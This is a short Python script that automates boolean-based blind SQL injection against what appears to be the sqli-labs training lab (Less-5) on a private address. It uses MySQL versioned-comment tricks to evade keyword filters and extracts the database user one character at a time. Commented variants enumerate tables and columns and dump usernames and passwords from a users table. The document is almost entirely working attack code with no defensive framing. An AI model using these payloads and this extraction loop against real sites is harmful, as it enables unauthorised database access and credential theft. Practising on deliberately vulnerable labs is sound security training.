#coding:utf-8


import requests

sql=""
httpsession = requests.session()
for i in range(1,17):
    for j in range(33,127):
        url = "http://192.168.150.131/sqli-labs/Less-5/?id=1' /*!11444and*/ ascii(substr((select user/*!80000aaa*/()),"+str(i)+",1))="+str(j)+" /*!11444and*/ '1'='1"
        #url = "http://192.168.150.139/sqli/Less-5/?id=1'/*!11444and*/ ascii(substr((/*!80000aaa*/select/*!80000aaa*/ table_name /*!80000aaa*/from/*!80000aaa*/ information_schema.tables where table_schema=database/*!80000aaa*/() limit 3,1),"+str(i)+",1))="+str(j)+" /*!11444and*/ '1' = '1"
        #url = "http://192.168.150.139/sqli/Less-5/?id=1'/*!11444and*/ ascii(substr((/*!80000aaa*/select/*!80000aaa*/ group_concat(column_name) /*!80000aaa*/from/*!80000aaa*/ information_schema.columns where table_schema='security' ),"+str(i)+",1))="+str(j)+" /*!11444and*/ '1' = '1"
        #url = "http://192.168.150.139/sqli/Less-5/?id=1'/*!11444and*/ ascii(substr((/*!80000aaa*/select/*!80000aaa*/ group_concat(username,password) /*!80000aaa*/from/*!80000aaa*/ users),"+str(i)+",1))="+str(j)+" /*!11444and*/ '1' = '1"
        r = httpsession.get(url=url)
        if "are" in r.content:
            sql+=chr(j)
            print sql
            break
